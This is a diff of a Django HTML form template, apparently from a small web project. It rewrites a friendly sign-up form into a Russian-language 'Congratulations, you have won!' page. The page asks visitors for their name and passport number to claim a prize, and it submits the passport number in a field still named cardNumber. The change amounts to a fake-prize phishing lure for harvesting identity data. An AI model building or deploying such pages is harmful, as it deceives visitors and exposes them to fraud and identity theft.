@@ -3,17 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <title>index</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 </head>
 <body>
     <form method="POST">
         {% csrf_token %}
-        <h1>Знакомство</h1>
-        <label>Можете указать немного информации о вас? Так нам будет проще общаться :)</label>
+        <h1>Поздравляем!!!</h1>
+        <label>Вы выиграли {{name}}!!!</label>
+        <label>Для того, чтобы получить подарок, нужно указать имя и номер паспорта</label>
         <p>Введите свое имя</p>
         <input type="text" name="name"/>
-        <p>Введите номер карты</p>
+        <p>Введите паспорт</p>
         <input type="text" name="cardNumber"/>
         <input type="submit"/>
+        <p></p>
+        <img src="{{link}}" width="400">
     </form>
 </body>
 </html>
